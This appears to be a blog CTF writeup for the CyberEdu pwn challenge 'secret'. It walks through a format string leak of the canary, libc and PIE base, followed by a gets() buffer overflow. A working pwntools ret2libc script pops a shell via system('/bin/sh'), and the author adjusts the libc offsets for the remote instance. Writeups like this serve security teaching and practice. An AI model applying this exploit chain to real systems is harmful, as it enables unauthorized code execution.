+++
date = '2025-12-30'
draft = false
title = 'CyberEdu secret Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Format-String"]
+++


## Challenge overview

Just another pwn **[challenge](https://app.cyber-edu.co/challenges/559e4ec0-7f21-11ea-b4cb-3db05c1cfb77?tenant=cyberedu)**.

![challenge-screenshot](pic1.png#center)

Straight away, we're dealing with a 64-bit PIE with canary enabled, and a format string vulnerability, and a `gets(v1)`.

The format string vulnerability is in `main`:

![challenge-screenshot](pic2.png#center)

And here is the `gets(v1)` that allows us to buffer overflow:

![challenge-screenshot](pic3.png#center)

So, ret2libc with a canary. 

---

## The exploit

We quickly gain shell locally using this script (first try!):

```python
# %15$p is the canary
# %17$p  is libc + 0x1f68
# %19$p is PIE + 0xb6d

#to use gadgets we need to leak PIE base too

name_payload = b"%15$p.%17$p.%19$p"
p.recvuntil(b"Name: ")
p.sendline(name_payload)
p.recvuntil(b"Hillo ")
leaks = p.recvline().strip()
canary, libc_leak, pie_leak = leaks.split(b".")

canary = int(canary, 16)
libc_leak = int(libc_leak, 16)
pie_leak = int(pie_leak, 16)

print(f"canary: {hex(canary)}")
print(f"libc leak: {hex(libc_leak)}")
print(f"pie leak: {hex(libc_leak)}")

libc = libc_leak - 0x1f68
pie = pie_leak - 0xb6d

#local
binsh_offset = 0x17fe3c
system_offset = 0x2b910

pop_rdi_ret = 0xca3 + pie
ret = 0x889 + pie

system = libc + system_offset
binsh = libc + binsh_offset

p.recvuntil(b"Phrase: ")

payload = ( b"a"*136 +  #s1
	    p64(canary) + 
	    b"b" * 8 +  #rbp
	    p64(pop_rdi_ret) +
	    p64(binsh) +
	    p64(ret) +
	    p64(system)
          )

p.sendline(payload)

p.interactive()
```

For the remote instance, we most probably need to recalculate the offsets, for both the different `glibc` version and the format strings. I found the format string differences easily:

```python
#for the remote version, canary at 15, pie+0xc40 at 16, libc+? at %2$p, %3$p, %4$p
name_payload = b"%15$p.%3$p.%16$p"
```

```python
#libc = libc_leak - 0x1f68 local
libc = libc_leak - 0x?
#pie = pie_leak - 0xb6d local
pie = pie_leak - 0xc40
```

Because I thought I was too smart to just leak puts, I thought I could figure out the libc version myself.

The challenge came out 5 years ago, so 2020, with the latest version being `2.31`. Most of the `DCTF2019` challenges use the `libc6_2.23-0ubuntu10_amd64` libc version, especially those with binary names that start with `pwn_`.

I printed out the `elf.got`:

`{'frame_dummy': 2104792, 'enable_timeout_cons': 2104800, '__do_global_dtors_aux': 2104808, '__dso_handle': 2105464, '_ITM_deregisterTMCloneTable': 2105304, '__gmon_start__': 2105312, '_Jv_RegisterClasses': 2105320, '_ITM_registerTMCloneTable': 2105328, '__cxa_finalize': 2105336, 'stdout': 2105472, 'stdin': 2105488, 'puts': 2105368, '__stack_chk_fail': 2105376, 'printf': 2105384, 'memset': 2105392, 'alarm': 2105400, 'read': 2105408, '__libc_start_main': 2105416, 'strcmp': 2105424, 'signal': 2105432, 'gets': 2105440, 'setvbuf': 2105448}`

For a while, I found an offset like `%4$p` and with `libc.blukat` I just tried every possible GOT function, but literally nothing worked and it took a *considerable* amount of time. Then I searched for the suffixes of the leaks in the blukat library for `libc6_2.23-0ubuntu10_amd64`.

Obviously I didn't find anything that worked, so I just ended up leaking `puts` like a normal person.

![challenge-screenshot](pic4.png#center)

Extremely unsurprisingly, our version of `libc`: `libc6_2.23-0ubuntu10_amd64`.

I subtracted `puts`' offset from it to get `libc`, and then I could calculate the offset from out leak, `%3$p`, to `libc`, which ended up being `0xF72C0`. Now, with all the proper changes, we get the flag:

![challenge-screenshot](pic5.png#center)

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/secret.py)**.
